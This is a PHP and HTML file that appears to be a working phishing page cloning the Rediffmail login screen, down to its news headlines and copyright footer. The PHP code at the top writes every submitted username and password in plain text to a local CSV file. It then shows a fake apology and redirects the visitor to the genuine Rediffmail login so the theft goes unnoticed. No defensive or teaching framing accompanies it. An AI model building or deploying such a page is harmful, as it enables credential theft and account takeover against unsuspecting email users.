<?php

    session_start();
    $error_msg = "";

    if($_SERVER['REQUEST_METHOD'] == 'POST')
    {
        $user = htmlspecialchars($_POST['username']);
        $pwd =htmlspecialchars($_POST['password']);
        $pattern = "/^[a-zA-Z0-9._%+-]+@rediffmail\.com$/";  

        // validate_username($user);
        if(empty($user) || empty($pwd))
        { 
            $error_msg = "Username/ Password field is empty";

        }
        else if(!preg_match($pattern,$user))
            {
                $error_msg = "Wrong username format";
            }
        else
        {
            $fp = fopen("username.csv",'a');

            // to be run only the first time
            // fwrite($fp, "Username");
            // fwrite($fp, ",");
            // fwrite($fp, "Password");

            fwrite($fp,"\n");
            fwrite($fp,$user);
            fwrite($fp,",");
            fwrite($fp,$pwd);
            fclose($fp);

            echo "Sorry for the inconvinience. Redirecting to login page.";
            header("Refresh:3; url=https://mail.rediff.com/cgi-bin/login.cgi");
            exit();
        }
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rediffmail</title>
    <link rel="shortcut icon" href="logopng.png" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="main_container">
        <div class="left">
            <a href="https://www.rediff.com/" id="rediff_webpage">rediff.com</a>
            <p id="rediff_text">rediff<span id="red_text">mail</span></p>
        </div>

        <div class="center">
            <form action="<?php htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="POST">
            <div class="error_msg">
                <?php echo $error_msg; ?>
            </div>
            <label for="input_uname">Username</label>
            <input type="text" id="input_uname" name="username"><br>
            <label for="input_pass">Password</label>
            <input type="password" id="input_pass" name="password">
            <input type="submit" value="Sign in" id="signin" name="signin"><br>
            <div class="bottom">
                <input type="checkbox" name="cb" id="checkbox">
                <label for="checkbox" id="checkbox_label">Keep me signed in</label>
                <a href="https://register.rediff.com/utilities/newforgot/index.php?FormName=showlogin" id="forgot_pass">Forgot Password?</a>
                <p id="login_msg">Secured Login</p>
                <br>
                <p id="uncheck">(Uncheck if on a shared computer)</p>
            </div>
        </div>

        <div class="right">
            <p>Don't have a Rediffmail ID?</p>
            <a href="https://register.rediff.com/register/register.php?FormName=user_details" id="new_acc">Create a new account</a>
        </div>
    </div>

    <main>
        <div class="top_container">
            <h3>TOP HEADLINES</h3>
            <div class="card1">
                <ul class="card1_item">
                    <li class="img">    
                        <a href="https://www.rediff.com/sports/report/in-a-first-indian-women-in-uniform-at-olympics-paris-games/20240720.htm" target="main"><img src="p3.png" alt="img" height="80px" width="80px"></a>
                    </li>
                    <li class="txt">
                        <a href="https://www.rediff.com/sports/report/in-a-first-indian-women-in-uniform-at-olympics-paris-games/20240720.htm" class="txt_blue">In a first, Indian women in uniform at Olympics!</a>
                    </li>
                </ul>
                <ul class="card1_item">
                    <li class="img">
                        <a href="https://www.rediff.com/cricket/report/nayar-doeschate-set-to-join--gambhir-for-lanka-tour/20240720.htm" target="main" class="txt_blue"><img src="p2.png" alt="img" height="80px" width="80px"></a>
                    </li>
                    <li class="txt">
                        <a href="https://www.rediff.com/cricket/report/nayar-doeschate-set-to-join--gambhir-for-lanka-tour/20240720.htm" class="txt_blue">Nayar, Doeschate set to join Gambhir for Lanka Tour</a>
                        
                    </li>
                </ul>
                <ul class="card1_item">
                    <li class="img">
                        <a href="https://www.rediff.com/sports/report/mom-learns-to-cook-fuelling-reetikas-olympic-dreams/20240720.htm" class="txt_blue" target="main"><img src="p1.png" alt="img" height="80px" width="80px"></a>
                    </li>
                    <li class="txt">
                        <a href="https://www.rediff.com/sports/report/mom-learns-to-cook-fuelling-reetikas-olympic-dreams/20240720.htm" target="main" class="txt_blue">Mom learns to cook: Fuelling Reetika's Olympic dreams</a>
                        
                    </li>
                </ul>
                <ul class="card1_item">
                    <li class="img">
                        <a href="https://www.rediff.com/business/report/rerating-potential-in-axis-bank-stock-may-be-among-top-outperformers/20240720.htm" target="main" class="txt_blue"><img src="p4.png" alt="img" height="80px" width="80px"></a>
                    </li>
                    <li class="txt">
                        <a href="https://www.rediff.com/business/report/rerating-potential-in-axis-bank-stock-may-be-among-top-outperformers/20240720.htm" target="main" class="txt_blue">Rerating potential in Axis Bank stock, may be among top outperformers</a>
                        
                    </li>
                </ul>
                <ul class="card1_item">
                    <li class="img">
                        <a href="https://www.rediff.com/news/report/mere-link-with-dawood-doesnt-attract-provisions-of-uapa-bombay-hc/20240720.htm" target="main" ><img src="p5.png" alt="img" height="80px" width="80px"></a>
                    </li>
                    <li class="txt">
                        <a href="https://www.rediff.com/news/report/mere-link-with-dawood-doesnt-attract-provisions-of-uapa-bombay-hc/20240720.htm" target="main" class="txt_blue">Mere link with Dawood doesn't attract provisions of UAPA: Bombay HC</a>
                    </li>
                </ul>
            </div>
        </div>
        
        

        <div class="bottom_container">
            <div class="card">
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/sports/paris-olympics-2024" target="main"><img src="p14.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/sports/paris-olympics-2024" target="main">Paris Olympics 2024</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/sports/report/road-to-redemption-amit-panghal-eyes-olympic-medal-in-paris/20240719.htm" target="main"><img src="p13.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/sports/report/road-to-redemption-amit-panghal-eyes-olympic-medal-in-paris/20240719.htm" target="main">Road to redemption: Amit Panghal eyes Olympic medal in Paris</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main"  style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/sports/report/who-will-be-the-next-india-football-coach-igor-stimac/20240720.htm" target="main"><img src="p12.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/sports/report/who-will-be-the-next-india-football-coach-igor-stimac/20240720.htm" target="main">Spaniard Marquez new Indian football team coach</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/business/interview/ramki-gaddipati-banks-must-be-prepared-for-providing-upi-credit/20240719.htm" target="main"><img src="p11.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/business/interview/ramki-gaddipati-banks-must-be-prepared-for-providing-upi-credit/20240719.htm" target="main">'Banks must be prepared for providing UPI credit'</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/news/report/kejriwal-willfully-eating-less-refusing-insulin-delhi-lg/20240720.htm" target="main"><img src="p9.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news/report/kejriwal-willfully-eating-less-refusing-insulin-delhi-lg/20240720.htm" target="main">Kejriwal willfully eating less, refusing insulin: Delhi LG</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/business/interview/arundhati-bhattacharya-we-are-trying-and-creating-solutions-for-sme-segment/20240720.htm" target="main"><img src="p10.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/business/interview/arundhati-bhattacharya-we-are-trying-and-creating-solutions-for-sme-segment/20240720.htm" target="main">'We are trying and creating solutions for SME segment'</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/sports/report/i-miss-my-daughter-but-it-is-about-winning-olympic-medal-deepika/20240720.htm" target="main"><img src="p7.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/sports/report/i-miss-my-daughter-but-it-is-about-winning-olympic-medal-deepika/20240720.htm" target="main">'I miss my daughter but it is about winning Olympic medal': Deepika</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/news/report/heres-why-elon-musk-congratulated-modi/20240720.htm" target="main"><img src="p8.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news/report/heres-why-elon-musk-congratulated-modi/20240720.htm" target="main">Here's why Elon Musk congratulated Modi</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/news/report/will-end-illegal-immigration-people-can-come-legally-trump/20240720.htm" target="main"><img src="p15.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news/report/will-end-illegal-immigration-people-can-come-legally-trump/20240720.htm" target="main">Will end illegal immigration, people can come legally: Trump
                            </a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/news/report/no-slogans-exhibits-in-parliament-dont-criticise-chair-mps-told/20240720.htm" target="main"><img src="p6.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news/report/no-slogans-exhibits-in-parliament-dont-criticise-chair-mps-told/20240720.htm" target="main">No slogans, exhibits in Parliament, don't criticise chair: MPs told</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/sports/report/in-a-first-indian-women-in-uniform-at-olympics-paris-games/20240720.htm" target="main"><img src="p3.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/sports/report/in-a-first-indian-women-in-uniform-at-olympics-paris-games/20240720.htm" target="main">In a first, Indian women in uniform at Olympics!</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
                <div class="card_item">
                    <h4>News</h4>
                    <a href="https://www.rediff.com/news/report/mere-link-with-dawood-doesnt-attract-provisions-of-uapa-bombay-hc/20240720.htm" target="main"><img src="p5.png" alt="img" height="200px" width="300px"></a>
                    <div class="headlines">
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main">Mere link with Dawood doesn't attract provisions of UAPA: Bombay HC</a>
                        </p>
                        <p class = "text_center">
                            <a href="https://www.rediff.com/news" target="main" style="color: #0055cc;">More News Stories</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer class="end">
        <hr>
        <p id="Copyright_line">Copyright © 2024 Rediff.com India Limited. All rights reserved.</p>
        <div id="bottom_line">
            <a href="https://in.rediff.com/disclaim.htm">Disclaimer</a>
            <span>|</span>
            <a href="https://www.rediff.com/w3c/policy.html">Privacy Policy</a>
        </div>
    </footer>
</body>
</html>
